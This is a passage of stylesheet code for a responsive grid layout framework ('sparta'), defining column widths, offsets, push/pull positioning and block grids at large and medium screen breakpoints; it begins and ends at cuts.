        .large-up [data-sparta-container] .row.spa-uncollapse-large>.columns.large-uncentered:last-child,
        .large-up [data-sparta-container] .row.spa-uncollapse-large>.column.large-uncentered:last-child {
            float: right
        }

        .large-up [data-sparta-container] .row>.large-12 {
            width: 100%
        }

        .large-up [data-sparta-container] .row>.large-11 {
            width: 91.66667%
        }

        .large-up [data-sparta-container] .row>.large-10 {
            width: 83.33333%
        }

        .large-up [data-sparta-container] .row>.large-9 {
            width: 75%
        }

        .large-up [data-sparta-container] .row>.large-8 {
            width: 66.66667%
        }

        .large-up [data-sparta-container] .row>.large-7 {
            width: 58.33333%
        }

        .large-up [data-sparta-container] .row>.large-6 {
            width: 50%
        }

        .large-up [data-sparta-container] .row>.large-5 {
            width: 41.66667%
        }

        .large-up [data-sparta-container] .row>.large-4 {
            width: 33.33333%
        }

        .large-up [data-sparta-container] .row>.large-3 {
            width: 25%
        }

        .large-up [data-sparta-container] .row>.large-2 {
            width: 16.66667%
        }

        .large-up [data-sparta-container] .row>.large-1 {
            width: 8.33333%
        }

        .large-up [data-sparta-container] .row>.large-offset-12 {
            margin-left: 100% !important
        }

        .large-up [data-sparta-container] .row>.large-offset-11 {
            margin-left: 91.66667% !important
        }

        .large-up [data-sparta-container] .row>.large-offset-10 {
            margin-left: 83.33333% !important
        }

        .large-up [data-sparta-container] .row>.large-offset-9 {
            margin-left: 75% !important
        }

        .large-up [data-sparta-container] .row>.large-offset-8 {
            margin-left: 66.66667% !important
        }

        .large-up [data-sparta-container] .row>.large-offset-7 {
            margin-left: 58.33333% !important
        }

        .large-up [data-sparta-container] .row>.large-offset-6 {
            margin-left: 50% !important
        }

        .large-up [data-sparta-container] .row>.large-offset-5 {
            margin-left: 41.66667% !important
        }

        .large-up [data-sparta-container] .row>.large-offset-4 {
            margin-left: 33.33333% !important
        }

        .large-up [data-sparta-container] .row>.large-offset-3 {
            margin-left: 25% !important
        }

        .large-up [data-sparta-container] .row>.large-offset-2 {
            margin-left: 16.66667% !important
        }

        .large-up [data-sparta-container] .row>.large-offset-1 {
            margin-left: 8.33333% !important
        }

        .large-up [data-sparta-container] .row>.large-offset-0 {
            margin-left: 0% !important
        }

        .large-up [data-sparta-container] .row>.large-push-12 {
            position: relative;
            left: 100%;
            right: auto
        }

        .large-up [data-sparta-container] .row>.large-push-11 {
            position: relative;
            left: 91.66667%;
            right: auto
        }

        .large-up [data-sparta-container] .row>.large-push-10 {
            position: relative;
            left: 83.33333%;
            right: auto
        }

        .large-up [data-sparta-container] .row>.large-push-9 {
            position: relative;
            left: 75%;
            right: auto
        }

        .large-up [data-sparta-container] .row>.large-push-8 {
            position: relative;
            left: 66.66667%;
            right: auto
        }

        .large-up [data-sparta-container] .row>.large-push-7 {
            position: relative;
            left: 58.33333%;
            right: auto
        }

        .large-up [data-sparta-container] .row>.large-push-6 {
            position: relative;
            left: 50%;
            right: auto
        }

        .large-up [data-sparta-container] .row>.large-push-5 {
            position: relative;
            left: 41.66667%;
            right: auto
        }

        .large-up [data-sparta-container] .row>.large-push-4 {
            position: relative;
            left: 33.33333%;
            right: auto
        }

        .large-up [data-sparta-container] .row>.large-push-3 {
            position: relative;
            left: 25%;
            right: auto
        }

        .large-up [data-sparta-container] .row>.large-push-2 {
            position: relative;
            left: 16.66667%;
            right: auto
        }

        .large-up [data-sparta-container] .row>.large-push-1 {
            position: relative;
            left: 8.33333%;
            right: auto
        }

        .large-up [data-sparta-container] .row>.large-pull-12 {
            position: relative;
            left: auto;
            right: 100%
        }

        .large-up [data-sparta-container] .row>.large-pull-11 {
            position: relative;
            left: auto;
            right: 91.66667%
        }

        .large-up [data-sparta-container] .row>.large-pull-10 {
            position: relative;
            left: auto;
            right: 83.33333%
        }

        .large-up [data-sparta-container] .row>.large-pull-9 {
            position: relative;
            left: auto;
            right: 75%
        }

        .large-up [data-sparta-container] .row>.large-pull-8 {
            position: relative;
            left: auto;
            right: 66.66667%
        }

        .large-up [data-sparta-container] .row>.large-pull-7 {
            position: relative;
            left: auto;
            right: 58.33333%
        }

        .large-up [data-sparta-container] .row>.large-pull-6 {
            position: relative;
            left: auto;
            right: 50%
        }

        .large-up [data-sparta-container] .row>.large-pull-5 {
            position: relative;
            left: auto;
            right: 41.66667%
        }

        .large-up [data-sparta-container] .row>.large-pull-4 {
            position: relative;
            left: auto;
            right: 33.33333%
        }

        .large-up [data-sparta-container] .row>.large-pull-3 {
            position: relative;
            left: auto;
            right: 25%
        }

        .large-up [data-sparta-container] .row>.large-pull-2 {
            position: relative;
            left: auto;
            right: 16.66667%
        }

        .large-up [data-sparta-container] .row>.large-pull-1 {
            position: relative;
            left: auto;
            right: 8.33333%
        }

        .large-up [data-sparta-container] .row>.large-reset-order {
            float: left;
            margin-left: 0;
            margin-right: 0;
            left: auto;
            right: auto
        }

        .large-up [data-sparta-container] .row .large-block-grid-12>li {
            width: 8.33333%;
            list-style: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-12>li:nth-of-type(1n) {
            clear: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-12>li:nth-of-type(12n+1) {
            clear: both
        }

        .large-up [data-sparta-container] .row .large-block-grid-11>li {
            width: 9.09091%;
            list-style: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-11>li:nth-of-type(1n) {
            clear: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-11>li:nth-of-type(11n+1) {
            clear: both
        }

        .large-up [data-sparta-container] .row .large-block-grid-10>li {
            width: 10%;
            list-style: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-10>li:nth-of-type(1n) {
            clear: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-10>li:nth-of-type(10n+1) {
            clear: both
        }

        .large-up [data-sparta-container] .row .large-block-grid-9>li {
            width: 11.11111%;
            list-style: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-9>li:nth-of-type(1n) {
            clear: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-9>li:nth-of-type(9n+1) {
            clear: both
        }

        .large-up [data-sparta-container] .row .large-block-grid-8>li {
            width: 12.5%;
            list-style: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-8>li:nth-of-type(1n) {
            clear: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-8>li:nth-of-type(8n+1) {
            clear: both
        }

        .large-up [data-sparta-container] .row .large-block-grid-7>li {
            width: 14.28571%;
            list-style: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-7>li:nth-of-type(1n) {
            clear: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-7>li:nth-of-type(7n+1) {
            clear: both
        }

        .large-up [data-sparta-container] .row .large-block-grid-6>li {
            width: 16.66667%;
            list-style: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-6>li:nth-of-type(1n) {
            clear: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-6>li:nth-of-type(6n+1) {
            clear: both
        }

        .large-up [data-sparta-container] .row .large-block-grid-5>li {
            width: 20%;
            list-style: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-5>li:nth-of-type(1n) {
            clear: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-5>li:nth-of-type(5n+1) {
            clear: both
        }

        .large-up [data-sparta-container] .row .large-block-grid-4>li {
            width: 25%;
            list-style: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-4>li:nth-of-type(1n) {
            clear: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-4>li:nth-of-type(4n+1) {
            clear: both
        }

        .large-up [data-sparta-container] .row .large-block-grid-3>li {
            width: 33.33333%;
            list-style: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-3>li:nth-of-type(1n) {
            clear: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-3>li:nth-of-type(3n+1) {
            clear: both
        }

        .large-up [data-sparta-container] .row .large-block-grid-2>li {
            width: 50%;
            list-style: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-2>li:nth-of-type(1n) {
            clear: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-2>li:nth-of-type(2n+1) {
            clear: both
        }

        .large-up [data-sparta-container] .row .large-block-grid-1>li {
            width: 100%;
            list-style: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-1>li:nth-of-type(1n) {
            clear: none
        }

        .large-up [data-sparta-container] .row .large-block-grid-1>li:nth-of-type(1n+1) {
            clear: both
        }

        .large-up [data-sparta-container] .row>.columns,
        .large-up [data-sparta-container] .row>.column {
            padding-left: 10px;
            padding-right: 10px
        }

        .large-up [data-sparta-container] .row>.columns.large-centered,
        .large-up [data-sparta-container] .row>.column.large-centered {
            float: none;
            margin-left: auto;
            margin-right: auto
        }

        .large-up [data-sparta-container] .row>.columns.large-centered:last-child,
        .large-up [data-sparta-container] .row>.column.large-centered:last-child {
            float: none
        }

        .large-up [data-sparta-container] .row>.columns.large-uncentered,
        .large-up [data-sparta-container] .row>.column.large-uncentered {
            float: left;
            margin-left: 0;
            margin-right: 0
        }

        .large-up [data-sparta-container] .row>.columns.large-uncentered:last-child,
        .large-up [data-sparta-container] .row>.column.large-uncentered:last-child {
            float: right
        }

        .large-up [data-sparta-container] [class*="block-grid-"] {
            display: block;
            padding: 0;
            margin: 0 -10px
        }

        .large-up [data-sparta-container] [class*="block-grid-"]>li {
            display: block;
            float: left;
            height: auto;
            padding: 0 10px 20px;
            list-style: none
        }

        .largeCentered [data-sparta-container] .row {
            width: 100%;
            margin-left: auto !important;
            margin-right: auto !important;
            padding-left: 10px;
            padding-right: 10px
        }

        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row,
        .spa-ui-layer.spa-ui-modal .row {
            margin-left: auto;
            margin-right: auto;
            padding-left: 5px;
            padding-right: 5px
        }

        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.collapse,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.small-collapse,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.spa-collapse-small,
        .spa-ui-layer.spa-ui-modal .row.collapse,
        .spa-ui-layer.spa-ui-modal .row.small-collapse,
        .spa-ui-layer.spa-ui-modal .row.spa-collapse-small {
            width: 100%;
            margin-left: auto;
            margin-right: auto;
            padding-left: 0;
            padding-right: 0
        }

        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.collapse>.columns,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.collapse>.column,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.small-collapse>.columns,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.small-collapse>.column,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.spa-collapse-small>.columns,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.spa-collapse-small>.column,
        .spa-ui-layer.spa-ui-modal .row.collapse>.columns,
        .spa-ui-layer.spa-ui-modal .row.collapse>.column,
        .spa-ui-layer.spa-ui-modal .row.small-collapse>.columns,
        .spa-ui-layer.spa-ui-modal .row.small-collapse>.column,
        .spa-ui-layer.spa-ui-modal .row.spa-collapse-small>.columns,
        .spa-ui-layer.spa-ui-modal .row.spa-collapse-small>.column {
            padding-left: 0;
            padding-right: 0
        }

        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.small-uncollapse,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.spa-uncollapse-small,
        .spa-ui-layer.spa-ui-modal .row.small-uncollapse,
        .spa-ui-layer.spa-ui-modal .row.spa-uncollapse-small {
            margin-left: auto;
            margin-right: auto;
            padding-left: 5px;
            padding-right: 5px
        }

        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column,
        .spa-ui-layer.spa-ui-modal .row>.columns,
        .spa-ui-layer.spa-ui-modal .row>.column {
            padding-left: 5px;
            padding-right: 5px
        }

        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns.small-centered,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns.centered,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column.small-centered,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column.centered,
        .spa-ui-layer.spa-ui-modal .row>.columns.small-centered,
        .spa-ui-layer.spa-ui-modal .row>.columns.centered,
        .spa-ui-layer.spa-ui-modal .row>.column.small-centered,
        .spa-ui-layer.spa-ui-modal .row>.column.centered {
            float: none;
            margin-left: auto;
            margin-right: auto
        }

        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns.small-centered:last-child,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns.centered:last-child,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column.small-centered:last-child,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column.centered:last-child,
        .spa-ui-layer.spa-ui-modal .row>.columns.small-centered:last-child,
        .spa-ui-layer.spa-ui-modal .row>.columns.centered:last-child,
        .spa-ui-layer.spa-ui-modal .row>.column.small-centered:last-child,
        .spa-ui-layer.spa-ui-modal .row>.column.centered:last-child {
            float: none
        }

        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns.small-uncentered,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns.uncentered,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column.small-uncentered,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column.uncentered,
        .spa-ui-layer.spa-ui-modal .row>.columns.small-uncentered,
        .spa-ui-layer.spa-ui-modal .row>.columns.uncentered,
        .spa-ui-layer.spa-ui-modal .row>.column.small-uncentered,
        .spa-ui-layer.spa-ui-modal .row>.column.uncentered {
            float: left;
            margin-left: 0;
            margin-right: 0
        }

        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns.small-uncentered:last-child,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.columns.uncentered:last-child,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column.small-uncentered:last-child,
        .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.column.uncentered:last-child,
        .spa-ui-layer.spa-ui-modal .row>.columns.small-uncentered:last-child,
        .spa-ui-layer.spa-ui-modal .row>.columns.uncentered:last-child,
        .spa-ui-layer.spa-ui-modal .row>.column.small-uncentered:last-child,
        .spa-ui-layer.spa-ui-modal .row>.column.uncentered:last-child {
            float: right
        }

        @media only screen and (min-width: 768px) {

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row,
            .spa-ui-layer.spa-ui-modal .row {
                margin-left: auto;
                margin-right: auto;
                padding-left: 7.5px;
                padding-right: 7.5px
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.medium-collapse,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.spa-collapse-medium,
            .spa-ui-layer.spa-ui-modal .row.medium-collapse,
            .spa-ui-layer.spa-ui-modal .row.spa-collapse-medium {
                margin-left: 0;
                margin-right: 0;
                padding-left: 0;
                padding-right: 0
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.medium-collapse>.columns,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.medium-collapse>.column,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.spa-collapse-medium>.columns,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.spa-collapse-medium>.column,
            .spa-ui-layer.spa-ui-modal .row.medium-collapse>.columns,
            .spa-ui-layer.spa-ui-modal .row.medium-collapse>.column,
            .spa-ui-layer.spa-ui-modal .row.spa-collapse-medium>.columns,
            .spa-ui-layer.spa-ui-modal .row.spa-collapse-medium>.column {
                padding-left: 0;
                padding-right: 0
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.medium-uncollapse,
            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row.spa-uncollapse-medium,
            .spa-ui-layer.spa-ui-modal .row.medium-uncollapse,
            .spa-ui-layer.spa-ui-modal .row.spa-uncollapse-medium {
                padding-left: 7.5px;
                padding-right: 7.5px
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-12,
            .spa-ui-layer.spa-ui-modal .row>.medium-12 {
                width: 100%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-11,
            .spa-ui-layer.spa-ui-modal .row>.medium-11 {
                width: 91.66667%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-10,
            .spa-ui-layer.spa-ui-modal .row>.medium-10 {
                width: 83.33333%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-9,
            .spa-ui-layer.spa-ui-modal .row>.medium-9 {
                width: 75%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-8,
            .spa-ui-layer.spa-ui-modal .row>.medium-8 {
                width: 66.66667%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-7,
            .spa-ui-layer.spa-ui-modal .row>.medium-7 {
                width: 58.33333%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-6,
            .spa-ui-layer.spa-ui-modal .row>.medium-6 {
                width: 50%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-5,
            .spa-ui-layer.spa-ui-modal .row>.medium-5 {
                width: 41.66667%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-4,
            .spa-ui-layer.spa-ui-modal .row>.medium-4 {
                width: 33.33333%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-3,
            .spa-ui-layer.spa-ui-modal .row>.medium-3 {
                width: 25%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-2,
            .spa-ui-layer.spa-ui-modal .row>.medium-2 {
                width: 16.66667%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-1,
            .spa-ui-layer.spa-ui-modal .row>.medium-1 {
                width: 8.33333%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-offset-12,
            .spa-ui-layer.spa-ui-modal .row>.medium-offset-12 {
                margin-left: 100% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-offset-11,
            .spa-ui-layer.spa-ui-modal .row>.medium-offset-11 {
                margin-left: 91.66667% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-offset-10,
            .spa-ui-layer.spa-ui-modal .row>.medium-offset-10 {
                margin-left: 83.33333% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-offset-9,
            .spa-ui-layer.spa-ui-modal .row>.medium-offset-9 {
                margin-left: 75% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-offset-8,
            .spa-ui-layer.spa-ui-modal .row>.medium-offset-8 {
                margin-left: 66.66667% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-offset-7,
            .spa-ui-layer.spa-ui-modal .row>.medium-offset-7 {
                margin-left: 58.33333% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-offset-6,
            .spa-ui-layer.spa-ui-modal .row>.medium-offset-6 {
                margin-left: 50% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-offset-5,
            .spa-ui-layer.spa-ui-modal .row>.medium-offset-5 {
                margin-left: 41.66667% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-offset-4,
            .spa-ui-layer.spa-ui-modal .row>.medium-offset-4 {
                margin-left: 33.33333% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-offset-3,
            .spa-ui-layer.spa-ui-modal .row>.medium-offset-3 {
                margin-left: 25% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-offset-2,
            .spa-ui-layer.spa-ui-modal .row>.medium-offset-2 {
                margin-left: 16.66667% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-offset-1,
            .spa-ui-layer.spa-ui-modal .row>.medium-offset-1 {
                margin-left: 8.33333% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-offset-0,
            .spa-ui-layer.spa-ui-modal .row>.medium-offset-0 {
                margin-left: 0% !important
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-push-12,
            .spa-ui-layer.spa-ui-modal .row>.medium-push-12 {
                position: relative;
                left: 100%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-push-11,
            .spa-ui-layer.spa-ui-modal .row>.medium-push-11 {
                position: relative;
                left: 91.66667%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-push-10,
            .spa-ui-layer.spa-ui-modal .row>.medium-push-10 {
                position: relative;
                left: 83.33333%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-push-9,
            .spa-ui-layer.spa-ui-modal .row>.medium-push-9 {
                position: relative;
                left: 75%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-push-8,
            .spa-ui-layer.spa-ui-modal .row>.medium-push-8 {
                position: relative;
                left: 66.66667%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-push-7,
            .spa-ui-layer.spa-ui-modal .row>.medium-push-7 {
                position: relative;
                left: 58.33333%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-push-6,
            .spa-ui-layer.spa-ui-modal .row>.medium-push-6 {
                position: relative;
                left: 50%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-push-5,
            .spa-ui-layer.spa-ui-modal .row>.medium-push-5 {
                position: relative;
                left: 41.66667%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-push-4,
            .spa-ui-layer.spa-ui-modal .row>.medium-push-4 {
                position: relative;
                left: 33.33333%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-push-3,
            .spa-ui-layer.spa-ui-modal .row>.medium-push-3 {
                position: relative;
                left: 25%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-push-2,
            .spa-ui-layer.spa-ui-modal .row>.medium-push-2 {
                position: relative;
                left: 16.66667%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-push-1,
            .spa-ui-layer.spa-ui-modal .row>.medium-push-1 {
                position: relative;
                left: 8.33333%;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-pull-12,
            .spa-ui-layer.spa-ui-modal .row>.medium-pull-12 {
                position: relative;
                left: auto;
                right: 100%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-pull-11,
            .spa-ui-layer.spa-ui-modal .row>.medium-pull-11 {
                position: relative;
                left: auto;
                right: 91.66667%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-pull-10,
            .spa-ui-layer.spa-ui-modal .row>.medium-pull-10 {
                position: relative;
                left: auto;
                right: 83.33333%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-pull-9,
            .spa-ui-layer.spa-ui-modal .row>.medium-pull-9 {
                position: relative;
                left: auto;
                right: 75%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-pull-8,
            .spa-ui-layer.spa-ui-modal .row>.medium-pull-8 {
                position: relative;
                left: auto;
                right: 66.66667%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-pull-7,
            .spa-ui-layer.spa-ui-modal .row>.medium-pull-7 {
                position: relative;
                left: auto;
                right: 58.33333%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-pull-6,
            .spa-ui-layer.spa-ui-modal .row>.medium-pull-6 {
                position: relative;
                left: auto;
                right: 50%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-pull-5,
            .spa-ui-layer.spa-ui-modal .row>.medium-pull-5 {
                position: relative;
                left: auto;
                right: 41.66667%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-pull-4,
            .spa-ui-layer.spa-ui-modal .row>.medium-pull-4 {
                position: relative;
                left: auto;
                right: 33.33333%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-pull-3,
            .spa-ui-layer.spa-ui-modal .row>.medium-pull-3 {
                position: relative;
                left: auto;
                right: 25%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-pull-2,
            .spa-ui-layer.spa-ui-modal .row>.medium-pull-2 {
                position: relative;
                left: auto;
                right: 16.66667%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-pull-1,
            .spa-ui-layer.spa-ui-modal .row>.medium-pull-1 {
                position: relative;
                left: auto;
                right: 8.33333%
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row>.medium-reset-order,
            .spa-ui-layer.spa-ui-modal .row>.medium-reset-order {
                float: left;
                margin-left: 0;
                margin-right: 0;
                left: auto;
                right: auto
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-12>li,
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-12>li {
                width: 8.33333%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-12>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-12>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-12>li:nth-of-type(12n+1),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-12>li:nth-of-type(12n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-11>li,
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-11>li {
                width: 9.09091%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-11>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-11>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-11>li:nth-of-type(11n+1),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-11>li:nth-of-type(11n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-10>li,
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-10>li {
                width: 10%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-10>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-10>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-10>li:nth-of-type(10n+1),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-10>li:nth-of-type(10n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-9>li,
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-9>li {
                width: 11.11111%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-9>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-9>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-9>li:nth-of-type(9n+1),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-9>li:nth-of-type(9n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-8>li,
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-8>li {
                width: 12.5%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-8>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-8>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-8>li:nth-of-type(8n+1),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-8>li:nth-of-type(8n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-7>li,
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-7>li {
                width: 14.28571%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-7>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-7>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-7>li:nth-of-type(7n+1),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-7>li:nth-of-type(7n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-6>li,
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-6>li {
                width: 16.66667%;
                list-style: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-6>li:nth-of-type(1n),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-6>li:nth-of-type(1n) {
                clear: none
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-6>li:nth-of-type(6n+1),
            .spa-ui-layer.spa-ui-modal .row .medium-block-grid-6>li:nth-of-type(6n+1) {
                clear: both
            }

            .sparta-media-query-utility-loading :not([data-sparta-widget]) .row .medium-block-grid-5>li,
